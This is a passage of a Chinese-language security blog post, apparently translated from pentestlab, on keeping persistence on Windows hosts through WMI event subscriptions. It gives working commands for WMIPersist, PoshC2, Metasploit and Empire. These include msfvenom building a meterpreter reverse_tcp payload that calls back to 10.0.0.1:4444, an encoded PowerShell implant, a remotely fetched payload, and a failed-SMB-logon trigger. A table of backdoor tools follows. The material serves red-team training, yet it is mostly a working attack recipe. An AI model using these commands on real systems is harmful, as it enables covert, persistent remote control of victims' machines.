+<h2 id="C＃"><a href="#C＃" class="headerlink" title="C＃"></a>C＃</h2><p><a target="_blank" rel="noopener" href="https://twitter.com/domchell">Dominic Chell开发了一个名为</a><a target="_blank" rel="noopener" href="https://github.com/mdsecactivebreach/WMIPersistence/">WMIPersist</a>的 C# 工具，它可以直接用作受感染主机上的可执行文件或通过 Cobalt Strike 使用。该工具将注册一个事件，该事件将在系统上创建目标进程时执行 base64 VBS 有效负载。</p>
+<p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328202551720.png" srcset="/img/loading.gif" lazyload alt="image-20220328202551720"></p>
+<p>Metasploit 实用程序“ <strong>msfvenom</strong> ”可以生成所需的有效负载，但也可以使用 任何其他工具，例如<a target="_blank" rel="noopener" href="https://github.com/trustedsec/unicorn">unicorn 。</a></p>
+<p><code>msfvenom -p windows/x64/meterpreter/reverse_tcp -f raw -o payload64.bin LHOST=10.0.0.1 LPORT=4444</code></p>
+<p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328202613087.png" srcset="/img/loading.gif" lazyload alt="image-20220328202613087"></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/mdsecactivebreach/SharpShooter">SharpShooter</a>可用于通过使用先前生成的 shellcode 原始文件生成 VBS 格式的无阶段负载。</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">python SharpShooter.py <span class="hljs-params">--stageless</span> <span class="hljs-params">--dotnetver</span> 2 <span class="hljs-params">--payload</span> vbs <span class="hljs-params">--output</span> implantvbs <span class="hljs-params">--rawscfile</span> payload64.bin<br>base64 -i output/implantvbs.vbs &gt; <span class="hljs-string">/home/pentestlab.txt</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328202631176.png" srcset="/img/loading.gif" lazyload alt="image-20220328202631176"></p>
+<p>有效负载可以嵌入到 WMIPersist 工具中，并且 csc.exe 实用程序（.NET 框架的一部分）可以编译源代码，以便将其转换为可执行文件。</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">csc.exe <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">WMIPersist</span>.</span></span>cs /r:<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span><span class="hljs-module"><span class="hljs-identifier">Management</span>.</span><span class="hljs-module"><span class="hljs-identifier">Automation</span>.</span></span>dll<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328202643540.png" srcset="/img/loading.gif" lazyload alt="image-20220328202643540"></p>
+<p>在目标主机上运行可执行文件或通过 Cobalt Strike（<strong>execute-assembly</strong>选项）将创建事件过滤器、事件使用者和订阅。</p>
+<p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328202653171.png" srcset="/img/loading.gif" lazyload alt="image-20220328202653171"></p>
+<p>从 PowerShell 控制台执行以下命令将验证有效负载是否存储在“ <strong>__EventConsumer** ”中并且“ **__EventFilter</strong> ”已创建。</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Get</span>-WMIObject -Namespace root/<span class="hljs-keyword">Subscription</span> -<span class="hljs-keyword">Class</span> __EventFilter<br><span class="hljs-keyword">Get</span>-WMIObject -Namespace root/<span class="hljs-keyword">Subscription</span> -<span class="hljs-keyword">Class</span> __EventConsumer<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328202746048.png" srcset="/img/loading.gif" lazyload alt="image-20220328202746048"></p>
+<p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328202756341.png" srcset="/img/loading.gif" lazyload alt="image-20220328202756341"></p>
+<p>当 notepad.exe 进程启动时，payload 将被执行并打开通信通道。默认情况下，此工具使用记事本，这是一个常见的 Windows 应用程序，但可以修改代码以针对任何其他常见进程，例如 word.exe、outlook.exe、excel.exe、calc.exe，具体取决于从主机收集的信息在<a target="_blank" rel="noopener" href="https://pentestlab.blog/2018/05/28/situational-awareness/">态势感知</a>期间。Metasploit 模块“ <em><strong>multi/handler</strong></em> ”或任何其他 C2 可用于捕获会话。</p>
+<p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328202807798.png" srcset="/img/loading.gif" lazyload alt="image-20220328202807798"></p>
+<h2 id="PoshC2"><a href="#PoshC2" class="headerlink" title="PoshC2"></a>PoshC2</h2><p><a target="_blank" rel="noopener" href="https://github.com/nettitude/PoshC2">PoshC2</a>是一个基于 PowerShell 的命令和控制框架，但支持 C# 植入和模块，以在红队参与期间规避 EDR 产品。有一个 PowerShell 模块可以通过在特定时间执行基于 64 编码的有效负载，在目标主机上部署 WMI 事件订阅的持久性技术。</p>
+<p><code>Invoke-wmievent -Name Posh -Command &quot;powershell -enc &lt;payload&gt;&quot; -Hour 21 -Minute 11</code></p>
+<p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328202844098.png" srcset="/img/loading.gif" lazyload alt="image-20220328202844098"></p>
+<p>当命令执行时，将创建 WMI 事件，并自动将修改的 WMI 对象的结果返回到控制台屏幕上以供验证。</p>
+<p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328202853337.png" srcset="/img/loading.gif" lazyload alt="image-20220328202853337"></p>
+<p>新植入物将在设置时连接回 C2 服务器。</p>
+<p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328202902929.png" srcset="/img/loading.gif" lazyload alt="image-20220328202902929"></p>
+<h2 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h2><p>Metasploit 框架包含一个通过 WMI 在目标系统上执行持久性的模块。该模块支持不同的选项，可用于触发要在系统上执行的任意有效负载。默认情况下，配置为在系统上创建特定事件 ID (4625) 时执行有效负载。支持的其他选项包括在登录期间、创建特定进程后、特定时间段后等执行有效负载。</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs gams">use exploit/windows/local/wmi_persistence<br><span class="hljs-keyword">set</span> SESSION <span class="hljs-comment">1</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">CALLBACK_INTERVAL 60000</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">USERNAME_TRIGGER pentestlab</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">PAYLOAD windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">LHOST 10.0.0.1</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">LPORT 4444</span><br>exploit<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328202918489.png" srcset="/img/loading.gif" lazyload alt="image-20220328202918489"></p>
+<p>该模块将提供所需的命令，该命令可用于使用错误密码通过 SMB 登录主机，以生成指定的失败登录请求。当命令执行时，将生成失败的登录事件，该事件将触发有效负载并打开一个 Meterpreter 会话。</p>
+<p><code>smbclient ////10.0.0.2//C$ -U pentestlab password</code></p>
+<p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328202938640.png" srcset="/img/loading.gif" lazyload alt="image-20220328202938640"></p>
+<p>在 vanilla Windows 10 版本中，系统会记录登录/注销期间的成功和失败尝试。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">auditpol <span class="hljs-regexp">/get /</span>subcategory:Logon<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328203000549.png" srcset="/img/loading.gif" lazyload alt="image-20220328203000549"></p>
+<h2 id="Empire"><a href="#Empire" class="headerlink" title="Empire"></a>Empire</h2><p>PowerShell Empire 有两个模块可以在 WMI 上建立持久性。以下模块可以在特定的每日时间、登录失败期间和启动时 5 分钟内执行有效负载。</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">usemodule persistence/elevated/wmi<br><span class="hljs-builtin-name">set</span> Listener WMI<br><span class="hljs-builtin-name">set</span> SubName Empire<br><span class="hljs-builtin-name">set</span> FailedLogon <span class="hljs-literal">True</span><br>execute<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328203036419.png" srcset="/img/loading.gif" lazyload alt="image-20220328203036419"></p>
+<p><strong>与 Metasploit 模块类似，当使用“ FailedLogon</strong> ”选项时，可以使用失败的 SMB 连接来触发基于 PowerShell 的植入。默认情况下，此选项会将两个连接返回到命令和控制服务器。</p>
+<p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328203045918.png" srcset="/img/loading.gif" lazyload alt="image-20220328203045918"></p>
+<p>“ <strong>wmi_updater</strong> ” 模块能够从远程位置获取有效负载，而不是将其存储在 WMI 存储库中。它将注册为“ <strong>AutoUpdater</strong> ”，并且可以在启动时或一天中的特定时间设置触发器。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">usemodule persistence<span class="hljs-regexp">/elevated/</span>wmi_updater*<br></code></pre></td></tr></table></figure>
+
+<h2 id="工具包"><a href="#工具包" class="headerlink" title="工具包"></a>工具包</h2><p>下表显示了红队可以使用的工具，以实现 WMI 事件订阅的持久性技术以及每个工具的可用触发器选项。</p>
+<table>
+<thead>
+<tr>
+<th><a target="_blank" rel="noopener" href="https://www.rapid7.com/db/modules/exploit/windows/local/wmi_persistence">Metasploit</a></th>
+<th>Ruby</th>
+<th>Failed Logon, Process, Startup, Timed</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><a target="_blank" rel="noopener" href="https://github.com/BC-SECURITY/Empire">Empire</a></td>
+<td>PowerShell</td>
+<td>Failed Logon, Startup, Timed</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://github.com/cobbr/SharpSploit/blob/master/SharpSploit/Persistence/WMI.cs">SharpSploit</a></td>
+<td>C#</td>
+<td>Process</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://github.com/mdsecactivebreach/WMIPersistence">WMIPersist</a></td>
+<td>C#</td>
+<td>Process</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://github.com/nettitude/PoshC2">PoshC2</a></td>
+<td>Python3</td>
+<td>Timed</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://github.com/jaredhaight/PowerPunch">PowerPunch</a></td>
+<td>PowerShell</td>
+<td>Logon, Startup</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://github.com/subesp0x10/Wmi-Persistence">Wmi-Persistence</a></td>
+<td>PowerShell</td>
+<td>Logon, Startup, Interval, Timed</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://github.com/Sw4mpf0x/PowerLurk">PowerLurk</a></td>
+<td>PowerShell</td>
+<td>USB, Logon, Process, Interval, Timed</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://gist.github.com/infosecn1nja/d9a42a68e9d3671e1fbadee5d7dc8964">WMI-Persistence</a></td>
+<td>PowerShell</td>
+<td>Up-time</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://github.com/xan7r/Misc">WMILogonBackdoor</a></td>
+<td>PowerShell</td>
+<td>Timed, Interval</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://github.com/xorrior/RandomPS-Scripts">WMIBackdoor</a></td>
+<td>PowerShell</td>
+<td>Timed, Interval</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://github.com/n0pe-sled/WMI-Persistence">WMI-Persistence</a></td>
+<td>PowerShell</td>
+<td>Timed</td>
+</tr>
+</tbody></table>
+<p>参考：<a target="_blank" rel="noopener" href="https://pentestlab.blog/2020/01/21/persistence-wmi-event-subscription/">https://pentestlab.blog/2020/01/21/persistence-wmi-event-subscription/</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/WMI/">WMI</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/WMI/">WMI</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E6%8C%81%E4%B9%85%E6%80%A7/">持久性</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/03/26/bypass-AMSI/">
+                        <span class="hidden-mobile">bypass-AMSI</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- LeanCloud 统计PV -->
+        <span id="leancloud-site-pv-container" style="display: none">
+            总访问量 
+            <span id="leancloud-site-pv"></span>
+             次
+          </span>
+      
+      
+        <!-- LeanCloud 统计UV -->
+        <span id="leancloud-site-uv-container" style="display: none">
+            总访客数 
+            <span id="leancloud-site-uv"></span>
+             人
+          </span>
+      
+
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.2/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+
+  <script defer src="/js/leancloud.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      $('#local-search-input').on('click', function() {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      });
+      $('#modalSearch').on('shown.bs.modal', function() {
+        $('#local-search-input').focus();
+      });
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
